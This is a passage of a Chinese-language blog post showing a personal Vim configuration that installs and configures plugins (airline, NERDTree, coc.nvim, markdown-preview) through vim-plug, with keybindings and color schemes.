class="comment">&quot;===首次使用自动配置===</span></span><br><span class="line"><span class="comment">&quot;===================</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">empty</span>(<span class="built_in">glob</span>(<span class="string">&#x27;~/.vim/autoload/plug.vim&#x27;</span>))</span><br><span class="line">  <span class="keyword">silent</span> !curl -fLo ~/.<span class="keyword">vim</span>/autoload/plug.<span class="keyword">vim</span> --create-dirs</span><br><span class="line">    \ http<span class="variable">s:</span>//raw.githubusercontent.<span class="keyword">com</span>/junegunn/<span class="keyword">vim</span>-plug/master/plug.<span class="keyword">vim</span></span><br><span class="line">  <span class="keyword">autocmd</span> VimEnter * PlugInstall --<span class="keyword">sync</span> | <span class="keyword">source</span> $MYVIMRC</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;=============</span></span><br><span class="line"><span class="comment">&quot;===插件安装===</span></span><br><span class="line"><span class="comment">&quot;====START====</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 安装plug：</span></span><br><span class="line"><span class="comment">&quot; curl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> plug#begin(<span class="string">&#x27;~/.vim/plugged&#x27;</span>)  <span class="comment">&quot; 启用plug安装</span></span><br><span class="line"><span class="comment">&quot; 插件github项目地址为：https://github.com/ 加 &#x27;&#x27; 中的内容</span></span><br><span class="line"><span class="comment">&quot; 如：https://github.com/vim-airline/vim-airline</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===状态栏===</span></span><br><span class="line">Plug <span class="string">&#x27;vim-airline/vim-airline&#x27;</span>	<span class="comment">&quot; 状态栏</span></span><br><span class="line">Plug <span class="string">&#x27;vim-airline/vim-airline-themes&#x27;</span>	<span class="comment">&quot; 状态栏主题</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===配色方案===</span></span><br><span class="line">Plug <span class="string">&#x27;lifepillar/vim-solarized8&#x27;</span>		<span class="comment">&quot; solarized8主题</span></span><br><span class="line">Plug <span class="string">&#x27;ayu-theme/ayu-vim&#x27;</span>				<span class="comment">&quot; ayu主题</span></span><br><span class="line">Plug <span class="string">&#x27;nathanaelkane/vim-indent-guides&#x27;</span>	<span class="comment">&quot; 显示缩进级别</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===目录树===</span></span><br><span class="line">Plug <span class="string">&#x27;scrooloose/nerdtree&#x27;</span>				<span class="comment">&quot; 目录树，方便浏览当前目录下的文件</span></span><br><span class="line">Plug <span class="string">&#x27;Xuyuanp/nerdtree-git-plugin&#x27;</span>      <span class="comment">&quot; 目录树git提示</span></span><br><span class="line">Plug <span class="string">&#x27;kien/ctrlp.vim&#x27;</span>					<span class="comment">&quot; 适用于大规模项目文件的浏览</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===自动化===</span></span><br><span class="line">Plug <span class="string">&#x27;neoclide/coc.nvim&#x27;</span>, &#123;<span class="string">&#x27;branch&#x27;</span>: <span class="string">&#x27;release&#x27;</span>&#125;		<span class="comment">&quot; 代码补全 需要vim &gt;=8 或neovim</span></span><br><span class="line">Plug <span class="string">&#x27;vim-syntastic/syntastic&#x27;</span>							<span class="comment">&quot; 错误语法提示</span></span><br><span class="line">Plug <span class="string">&#x27;jiangmiao/auto-pairs&#x27;</span>			<span class="comment">&quot; 符号补全</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===历史===</span></span><br><span class="line">Plug <span class="string">&#x27;mbbill/undotree&#x27;</span>					<span class="comment">&quot; 历史修改撤回</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===文本===</span></span><br><span class="line">Plug <span class="string">&#x27;godlygeek/tabular&#x27;</span>				<span class="comment">&quot; 文本过滤、对齐工具</span></span><br><span class="line">Plug <span class="string">&#x27;gcmt/wildfire.vim&#x27;</span>				<span class="comment">&quot; 视图模式下快速选中符号中的内容</span></span><br><span class="line">Plug <span class="string">&#x27;scrooloose/nerdcommenter&#x27;</span>			<span class="comment">&quot; 快速注释一行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===markdon===</span></span><br><span class="line">Plug <span class="string">&#x27;iamcco/markdown-preview.nvim&#x27;</span>, &#123; <span class="string">&#x27;do&#x27;</span>: &#123; -&gt; mkdp#util#install() &#125; &#125; <span class="comment">&quot; markdowm预览</span></span><br><span class="line">Plug <span class="string">&#x27;dhruvasagar/vim-table-mode&#x27;</span>, &#123; <span class="string">&#x27;on&#x27;</span>: <span class="string">&#x27;TableModeToggle&#x27;</span> &#125;	<span class="comment">&quot; 表格制作工具</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===其他===</span></span><br><span class="line">Plug <span class="string">&#x27;yianwillis/vimcdoc&#x27;</span>				<span class="comment">&quot; vim中文帮助</span></span><br><span class="line"><span class="string">&quot;Plug &#x27;liuchengxu/vim-which-key&#x27;			&quot;</span> 显示被绑定的可用按键</span><br><span class="line"><span class="comment">&quot;==依赖==</span></span><br><span class="line">Plug <span class="string">&#x27;MarcWeber/vim-addon-mw-utils&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;kana/vim-textobj-user&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;fadein/vim-FIGlet&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> plug#end()		<span class="comment">&quot;结束plug安装</span></span><br><span class="line"><span class="comment">&quot; 刷新vimrc后使用 :PlugInstall 安装插件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;=====END=====</span></span><br><span class="line"><span class="comment">&quot;===插件安装===</span></span><br><span class="line"><span class="comment">&quot;=============</span></span><br></pre></td></tr></table></figure>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot;=============</span></span><br><span class="line"><span class="comment">&quot;===插件配置===</span></span><br><span class="line"><span class="comment">&quot;====START====</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;pyhon解释器位置</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:python_host_prog</span>=<span class="string">&#x27;/usr/bin/python2&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:python3_host_prog</span>=<span class="string">&#x27;/usr/bin/python3&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===状态栏===</span></span><br><span class="line"><span class="comment">&quot;==airline状态栏==</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline</span>#extensions#tabline#enabled = <span class="number">1</span>	<span class="comment">&quot; airline 显示选项卡和缓冲区</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_theme</span>=<span class="string">&#x27;jellybeans&#x27;</span></span><br><span class="line"><span class="comment">&quot; 状态栏分隔美化  需要安装powerline-fonts字体（https://github.com/powerline/fonts） #sudo pacman -S powerline-fonts</span></span><br><span class="line"><span class="keyword">if</span> !exists(<span class="string">&#x27;g:airline_symbols&#x27;</span>)</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">g:airline_symbols</span> = &#123;&#125;</span><br><span class="line">  <span class="keyword">endif</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_left_sep</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_left_alt_sep</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_right_sep</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_right_alt_sep</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.branch = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.readonly = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.linenr = <span class="string">&#x27;☰&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.maxlinenr = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.dirty= <span class="string">&#x27;⚡&#x27;</span></span><br><span class="line"><span class="comment">&quot;==状态模式简洁显示==</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_mode_map</span> = &#123;</span><br><span class="line">      \ <span class="string">&#x27;__&#x27;</span>     : <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;c&#x27;</span>      : <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;i&#x27;</span>      : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;ic&#x27;</span>     : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;ix&#x27;</span>     : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;n&#x27;</span>      : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;multi&#x27;</span>  : <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;ni&#x27;</span>     : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;no&#x27;</span>     : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;R&#x27;</span>      : <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;Rv&#x27;</span>     : <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;s&#x27;</span>      : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;S&#x27;</span>      : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;&#x27;</span>     : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;t&#x27;</span>      : <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;v&#x27;</span>      : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;V&#x27;</span>      : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;&#x27;</span>     : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">      \ &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===配色方案===</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span>c1 :<span class="keyword">set</span> background=dark<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">colorscheme</span> solarized8<span class="symbol">&lt;CR&gt;</span>:AirlineTheme jellybeans<span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot;配色1</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span>c2 :<span class="keyword">set</span> background=light<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">let</span> ayucolor=<span class="string">&#x27;light&#x27;</span><span class="symbol">&lt;CR&gt;</span>:<span class="keyword">colorscheme</span> ayu<span class="symbol">&lt;CR&gt;</span>:AirlineTheme ayu_light<span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 配色2</span></span><br><span class="line"><span class="keyword">set</span> termguicolors	<span class="comment">&quot;开启真彩支持</span></span><br><span class="line"><span class="keyword">set</span> background=dark</span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:solarized_termtrans</span>=<span class="number">1</span>	<span class="comment">&quot; 透明背景</span></span><br><span class="line"><span class="keyword">colorscheme</span> solarized8</span><br><span class="line"><span class="string">&quot;let ayucolor=&#x27;light&#x27;	&quot;</span> light mirage dark</span><br><span class="line"><span class="comment">&quot;colorscheme ayu</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===目录树===</span></span><br><span class="line"><span class="comment">&quot;==NERDTreeToggle==</span></span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;F3&gt;</span> :NERDTreeToggle<span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 设置目录树快捷键</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;==NERDTree-git提示==</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:NERDTreeIndicatorMapCustom</span> = &#123;</span><br><span class="line">    \ <span class="string">&quot;Modified&quot;</span>  : <span class="string">&quot;✹&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Staged&quot;</span>    : <span class="string">&quot;✚&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Untracked&quot;</span> : <span class="string">&quot;✭&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Renamed&quot;</span>   : <span class="string">&quot;➜&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Unmerged&quot;</span>  : <span class="string">&quot;═&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Deleted&quot;</span>   : <span class="string">&quot;✖&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Dirty&quot;</span>     : <span class="string">&quot;✗&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Clean&quot;</span>     : <span class="string">&quot;✔︎&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Unknown&quot;</span>   : <span class="string">&quot;?&quot;</span></span><br><span class="line">    \ &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;==大规模项目文件浏览==</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;C-p&gt;</span> :CtrlP<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ctrlp_prompt_mappings</span> = &#123;</span><br><span class="line">  \ <span class="string">&#x27;PrtSelectMove(&quot;j&quot;)&#x27;</span>:   [<span class="string">&#x27;&lt;c-e&gt;&#x27;</span>, <span class="string">&#x27;&lt;down&gt;&#x27;</span>],</span><br><span class="line">  \ <span class="string">&#x27;PrtSelectMove(&quot;k&quot;)&#x27;</span>:   [<span class="string">&#x27;&lt;c-u&gt;&#x27;</span>, <span class="string">&#x27;&lt;up&gt;&#x27;</span>],</span><br><span class="line">  \ &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">&quot;===自动化===</span></span><br><span class="line"><span class="comment">&quot;==coc配置==</span></span><br><span class="line"><span class="comment">&quot; 查看：https://github.com/neoclide/coc.nvim 中Extensions的列表 </span></span><br><span class="line"><span class="comment">&quot; 执行命令安装coc对相应语言的补全</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; 若表中没有需要的，可参考 &quot;</span>Register custom <span class="keyword">language</span> servers<span class="comment">&quot; 进行配置</span></span><br><span class="line"><span class="comment">&quot; 参考教程：https://www.jianshu.com/p/231bfb066051</span></span><br><span class="line"><span class="keyword">set</span> timeoutlen=<span class="number">500</span> 		<span class="comment">&quot; 设置按键超时为500ms</span></span><br><span class="line"><span class="keyword">set</span> cmdheight=<span class="number">2</span> 		<span class="comment">&quot; 设置命令行行数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;C-d&gt;</span> <span class="symbol">&lt;Esc&gt;</span>:<span class="keyword">set</span> cmdheight=<span class="number">2</span><span class="symbol">&lt;CR&gt;</span><span class="keyword">a</span></span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;C-t&gt;</span> <span class="symbol">&lt;Esc&gt;</span>:<span class="keyword">set</span> cmdheight=<span class="number">10</span><span class="symbol">&lt;CR&gt;</span><span class="keyword">a</span></span><br><span class="line"><span class="keyword">nnoremap</span> <span class="symbol">&lt;C-d&gt;</span> :<span class="keyword">set</span> cmdheight=<span class="number">2</span><span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">nnoremap</span> <span class="symbol">&lt;C-t&gt;</span> :<span class="keyword">set</span> cmdheight=<span class="number">10</span><span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> updatetime=<span class="number">1000</span></span><br><span class="line"><span class="keyword">set</span> shortmess+=<span class="keyword">c</span></span><br><span class="line"><span class="keyword">set</span> signcolumn=yes</span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;silent&gt;</span><span class="symbol">&lt;expr&gt;</span> <span class="symbol">&lt;TAB&gt;</span></span><br><span class="line">      \ <span class="built_in">pumvisible</span>() ? <span class="string">&quot;\&lt;C-n&gt;&quot;</span> :</span><br><span class="line">      \ <span class="symbol">&lt;SID&gt;</span>check_back_space() ? <span class="string">&quot;\&lt;TAB&gt;&quot;</span> :</span><br><span class="line">      \ coc#refresh()</span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;expr&gt;</span><span class="symbol">&lt;S-TAB&gt;</span> <span class="built_in">pumvisible</span>() ? <span class="string">&quot;\&lt;C-p&gt;&quot;</span> : <span class="string">&quot;\&lt;C-h&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>! <span class="title">s</span>:<span class="title">check_back_space</span><span class="params">()</span> <span class="title">abort</span></span></span><br><span class="line">  <span class="keyword">let</span> <span class="keyword">col</span> = <span class="keyword">col</span>(<span class="string">&#x27;.&#x27;</span>) - <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> !col || <span class="built_in">getline</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="keyword">col</span> - <span class="number">1</span>]  =~# <span class="string">&#x27;\s&#x27;</span></span><br><span class="line"><span class="keyword">endfunction</span></span><br><span class="line"><span class="comment">&quot; 使用&lt;cr&gt;确认完成，`&lt;C-g&gt; u`表示在当前位置断开撤销链</span></span><br><span class="line"><span class="comment">&quot; Coc仅在确认时执行片段和其他编辑</span></span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;expr&gt;</span> <span class="symbol">&lt;cr&gt;</span> <span class="built_in">pumvisible</span>() ? <span class="string">&quot;\&lt;C-y&gt;&quot;</span> : <span class="string">&quot;\&lt;C-g&gt;u\&lt;CR&gt;&quot;</span></span><br><span class="line"><span class="comment">&quot; 使用K在预览窗口中显示文档</span></span><br><span class="line"><span class="keyword">nnoremap</span> ? :<span class="keyword">call</span> <span class="symbol">&lt;SID&gt;</span>show_documentation()<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>! <span class="title">s</span>:<span class="title">show_documentation</span><span class="params">()</span></span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">index</span>([<span class="string">&#x27;vim&#x27;</span>,<span class="string">&#x27;help&#x27;</span>], &amp;<span class="keyword">filetype</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">execute</span> <span class="string">&#x27;h &#x27;</span>.<span class="built_in">expand</span>(<span class="string">&#x27;&lt;cword&gt;&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">call</span> CocAction(<span class="string">&#x27;doHover&#x27;</span>)</span><br><span class="line">  <span class="keyword">endif</span></span><br><span class="line"><span class="keyword">endfunction</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 突出显示CursorHold上光标下的符号</span></span><br><span class="line"><span class="keyword">autocmd</span> CursorHold * <span class="keyword">silent</span> <span class="keyword">call</span> CocActionAsync(<span class="string">&#x27;highlight&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;==自定义补全==</span></span><br><span class="line"><span class="comment">&quot;=html自动补全标签=</span></span><br><span class="line"><span class="keyword">autocmd</span> BufNewFile *  <span class="keyword">setlocal</span> <span class="keyword">filetype</span>=html</span><br><span class="line"><span class="function"><span class="keyword">function</span>! <span class="title">InsertHtmlTag</span><span class="params">()</span></span></span><br><span class="line">	<span class="keyword">let</span> pat = <span class="string">&#x27;\c&lt;\w\+\s*\(\s\+\w\+\s*=\s*[&#x27;</span><span class="string">&#x27;#$;,().&quot;a-z0-9]\+\)*\s*&gt;&#x27;</span></span><br><span class="line">	normal! <span class="keyword">a</span>&gt;</span><br><span class="line">	<span class="keyword">let</span> save_cursor = <span class="built_in">getpos</span>(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">	<span class="keyword">let</span> result = <span class="built_in">matchstr</span>(<span class="built_in">getline</span>(save_cursor[<span class="number">1</span>]), pat)</span><br><span class="line">	<span class="comment">&quot;if (search(pat, &#x27;b&#x27;, save_cursor[1]) &amp;&amp; searchpair(&#x27;&lt;&#x27;,&#x27;&#x27;,&#x27;&gt;&#x27;,&#x27;bn&#x27;,0,  getline(&#x27;.&#x27;)) &gt; 0)</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">search</span>(pat, <span class="string">&#x27;b&#x27;</span>, save_cursor[<span class="number">1</span>]))</span><br><span class="line">		normal! lyiwf&gt;</span><br><span class="line">		normal! <span class="keyword">a</span>&lt;/</span><br><span class="line">		normal! <span class="keyword">p</span></span><br><span class="line">		normal! <span class="keyword">a</span>&gt;</span><br><span class="line">	<span class="keyword">endif</span></span><br><span class="line">	:<span class="keyword">call</span> <span class="built_in">cursor</span>(save_cursor[<span class="number">1</span>], save_cursor[<span class="number">2</span>], save_cursor[<span class="number">3</span>])</span><br><span class="line"><span class="keyword">endfunction</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===历史===</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:undotree_DiffAutoOpen</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">l</span> :UndotreeToggle<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===文本===</span></span><br><span class="line"><span class="comment">&quot;==过滤对齐工具==</span></span><br><span class="line"><span class="comment">&quot;使用 :Tabularize /|	使文本向 | 对齐,可是其他符号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;==快速选中==</span></span><br><span class="line"><span class="string">&quot;视图模式下，使用 i&#x27; 快速选中 &#x27;&#x27; 中的内容，其他: i&quot;</span> i) i] i&#125; ip</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;==快速注释==</span></span><br><span class="line"><span class="comment">&quot;输入 &lt;space&gt;cc 对该行注释</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===markdon===</span></span><br><span class="line"><span class="comment">&quot;==MarkdownPreview配置==</span></span><br><span class="line"><span class="comment">&quot; 设置为1，nvim将在进入降价缓冲区后打开预览窗口,默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_auto_start</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1，当从降价缓冲区转换到另一个缓冲区时，nvim将自动关闭当前预览窗口,默认1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_auto_close</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1时，vim将在保存缓冲区时刷新markdown或从插入模式退出，默认0为自动刷新markdown，因为您编辑或移动光标,默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_refresh_slow</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1，MarkdownPreview命令可用于所有文件，默认情况下可用于markdown文件,默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_command_for_global</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1，默认情况下预览服务器可供网络中的其他人使用，服务器侦听localhost（127.0.0.1,默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_open_to_the_world</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 当您在远程vim中工作并在本地浏览器上预览时，使用自定义IP打开预览页面非常有用。详细信息请参阅:https://github.com/iamcco/markdown-preview.nvim/pull/9,默认空</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_open_ip</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 指定浏览器打开预览页面，默认：&#x27;&#x27;,firefox浏览器快熟关闭窗口需要设置：</span></span><br><span class="line"><span class="comment">&quot; about:config &gt; dom.allow_scripts_to_close_windows 将值设置为 true</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_browser</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1，打开预览页面时，在命令行中回显预览页面url，默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_echo_preview_url</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 自定义vim函数名称打开预览页面此函数将接收url作为param，默认空</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_browserfunc</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; markdown渲染选项</span></span><br><span class="line"><span class="comment">&quot; mkit: markdown-it选项</span></span><br><span class="line"><span class="comment">&quot; katex: katex选项</span></span><br><span class="line"><span class="comment">&quot; uml: markdown-it-plantuml选项</span></span><br><span class="line"><span class="comment">&quot; maid: mermaid选项</span></span><br><span class="line"><span class="comment">&quot; disable_sync_scroll: 禁用同步滚动，默认0</span></span><br><span class="line"><span class="comment">&quot; sync_scroll_type: &#x27;middle&#x27;, &#x27;top&#x27; or &#x27;relative&#x27;, default value is &#x27;middle&#x27;</span></span><br><span class="line"><span class="comment">&quot;   middle: 表示光标位置总是显示在预览页面的中间</span></span><br><span class="line"><span class="comment">&quot;   top: 表示预览页面顶部的vim顶部视口总是显示</span></span><br><span class="line"><span class="comment">&quot;   relative: 表示光标位置总是显示在预览页面的相对位置</span></span><br><span class="line"><span class="comment">&quot; hide_yaml_meta: 隐藏yaml元数据，默认1</span></span><br><span class="line"><span class="comment">&quot; sequence_diagrams: js-sequence-diagrams 选项</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_preview_options</span> = &#123;</span><br><span class="line">    \ <span class="string">&#x27;mkit&#x27;</span>: &#123;&#125;,</span><br><span class="line">    \ <span class="string">&#x27;katex&#x27;</span>: &#123;&#125;,</span><br><span class="line">    \ <span class="string">&#x27;uml&#x27;</span>: &#123;&#125;,</span><br><span class="line">    \ <span class="string">&#x27;maid&#x27;</span>: &#123;&#125;,</span><br><span class="line">    \ <span class="string">&#x27;disable_sync_scroll&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    \ <span class="string">&#x27;sync_scroll_type&#x27;</span>: <span class="string">&#x27;middle&#x27;</span>,</span><br><span class="line">    \ <span class="string">&#x27;hide_yaml_meta&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    \ <span class="string">&#x27;sequence_diagrams&#x27;</span>: &#123;&#125;</span><br><span class="line">    \ &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 使用自定义markdown样式必须是绝对路径</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_markdown_css</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 使用自定义高亮样式必须绝对路径</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_highlight_css</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 使用自定义端口启动服务器或使用随机空白</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_port</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 预览页面标题，$ &#123;name&#125;将替换为文件名</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_page_title</span> = <span class="string">&#x27;「$&#123;name&#125;」&#x27;</span></span><br><span class="line">|</span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;F8&gt;</span> <span class="symbol">&lt;Plug&gt;</span>MarkdownPreview</span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;F9&gt;</span> <span class="symbol">&lt;Plug&gt;</span>MarkdownPreviewStop</span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;LEADER&gt;</span>mt <span class="symbol">&lt;Plug&gt;</span>MarkdownPreviewToggle</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;==表格制作工具==</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">tm</span> :TableModeToggle<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===其他===</span></span><br><span class="line"><span class="comment">&quot;==中文帮组==</span></span><br><span class="line"><span class="keyword">set</span> helplang=<span class="keyword">cn</span>		<span class="comment">&quot; 启用英文的为en</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;==显示按键绑定==</span></span><br><span class="line"><span class="comment">&quot;nnoremap &lt;silent&gt; &lt;leader&gt; :WhichKey &#x27;&lt;Space&gt;&#x27;&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;=====END=====</span></span><br><span class="line"><span class="comment">&quot;===插件配置===</span></span><br><span class="line"><span class="comment">&quot;=============</span></span><br></pre></td></tr></table></figure>
